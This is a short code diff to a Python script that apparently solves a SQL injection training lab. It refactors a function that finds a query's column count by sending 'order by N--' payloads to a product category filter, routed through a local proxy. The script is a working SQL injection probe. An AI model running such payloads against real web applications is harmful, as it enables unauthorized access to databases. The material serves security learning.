@@ -9,12 +9,15 @@ proxies = {
     'https':'http://127.0.0.1:8080'
 }
 
-def exploit_sqli_column_number(url):
+def perform_request(url,sql_payload):
     path = "filter?category=Tech+gifts"
+    r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
+    return r.text
+
+def exploit_sqli_column_number(url):    
     for i in range(1,50):
-        sql_payload = "'+order+by+%s--" %i
-        r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
-        res = r.text
+        sql_payload = "'+order+by+%s--" %i       
+        res = perform_request(url,sql_payload)   
         if "Internal Server Error" in res:
             return i - 1
         i = i + 1
